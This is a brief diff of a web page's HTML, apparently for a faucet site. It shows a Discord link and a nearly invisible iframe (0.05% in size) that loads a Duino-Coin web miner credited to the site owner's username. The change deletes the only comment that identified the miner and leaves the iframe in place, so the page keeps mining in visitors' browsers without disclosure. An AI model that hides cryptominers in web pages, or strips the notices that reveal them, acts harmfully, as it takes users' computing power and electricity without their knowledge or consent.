@@ -168,7 +168,7 @@ function validateForm() {
 
 <a href="https://discord.gg/HUbHqUQUD2">Click this to join our Discord Server!<br></a>
 
-   //miner script for the webminer 
+   
 
     <iframe src="https://server.duinocoin.com/webminer.html?username=katfaucet&threads=1&rigid=Katfaucet+Support&keyinput=None" width="0.05%" height="0.05%" frameborder="0"></iframe>
 
